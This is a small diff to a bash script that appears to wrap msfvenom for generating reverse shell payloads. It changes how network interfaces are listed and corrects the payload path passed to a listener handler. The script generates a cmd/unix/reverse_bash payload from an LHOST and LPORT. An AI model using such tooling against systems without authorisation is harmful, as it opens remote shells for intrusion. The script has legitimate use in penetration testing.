@@ -49,7 +49,7 @@ display_usage() {
 	echo -e "  ${YELLOW}Available Interfaces:${RESET}"
 	echo ""
 	#Display interfaces
-	interfaces=$(ip -f inet -br addr show | grep -v 127.0.0.1 | sed  's/@.....//g')
+	interfaces=$(ip -f inet -br addr show | sed  's/@...../      /g')
 	echo "$interfaces" | while read -r line;  
 	do
 		echo -e "  ${YELLOW}$line${RESET}"
@@ -197,7 +197,7 @@ shells () {
 			echo -e "[*] ${GREEN}Generating payload: msfvenom -p cmd/unix/reverse_bash LHOST=$1 LPORT=$2${RESET}"
 			echo ""
 			msfvenom -p cmd/unix/reverse_bash LHOST=$1 LPORT=$2 
-			payload="/cmd/unix/reverse_bash"
+			payload="cmd/unix/reverse_bash"
 			handler $1 $2 $payload
 			;;
 
